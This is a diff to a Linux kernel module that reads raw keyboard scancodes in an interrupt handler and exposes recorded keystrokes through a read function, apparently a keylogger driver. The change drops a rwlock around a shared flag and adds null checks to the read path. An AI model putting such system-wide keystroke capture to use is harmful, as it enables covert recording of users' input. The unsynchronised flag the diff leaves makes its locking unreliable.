@@ -56,8 +56,13 @@ static void got_char(unsigned long scancode_addr);
 
 DECLARE_TASKLET(kbtask, got_char, (unsigned long)&sc);
 
-DEFINE_RWLOCK(array_lock);
+/*
+ * DEFINE_RWLOCK(array_lock);
+ * DEFINE_RWLOCK(misc_lock);
+ */
+
 DEFINE_RWLOCK(misc_lock);
+
 static struct mutex g_mutex;
 
 /*
@@ -112,9 +117,7 @@ static void got_char(unsigned long scancode_addr)
 	struct keycodes *array;
 	unsigned char scancode = *(char *)scancode_addr;
 
-	write_lock(&array_lock);
 	stop_interrupt = 1;
-	write_unlock(&array_lock);
 	if (!(new = kmalloc(sizeof(struct s_stroke), GFP_ATOMIC)))
 		goto end;
 	if (scancode == 0xe0) {
@@ -163,18 +166,14 @@ static void got_char(unsigned long scancode_addr)
 	write_unlock(&misc_lock);
 	multi = 0;
 end:
-	write_lock(&array_lock);
 	stop_interrupt = 0;
-	write_unlock(&array_lock);
 }
 
 irq_handler_t irq_handler (int irq, void *dev_id, struct pt_regs *regs)
 {
 	sc = inb(0x60) % 256;
-	read_lock(&array_lock);
 	if (stop_interrupt)
 		goto end;
-	read_unlock(&array_lock);
 	tasklet_schedule(&kbtask);
 end:
 	return (irq_handler_t) IRQ_HANDLED;
@@ -277,10 +276,12 @@ clean:
 
 static ssize_t kbread(struct file *f, char __user *s, size_t n, loff_t *o)
 {
-	int ret = 0;
+	int ret = -EINVAL;
 
-	if (!read_buffer)
+	if (!read_buffer || !s || !o) {
+		printk("null buffer\n");
 		goto clean;
+	}
 	ret = mutex_lock_interruptible(&g_mutex);
 	if (ret)
 		goto clean;
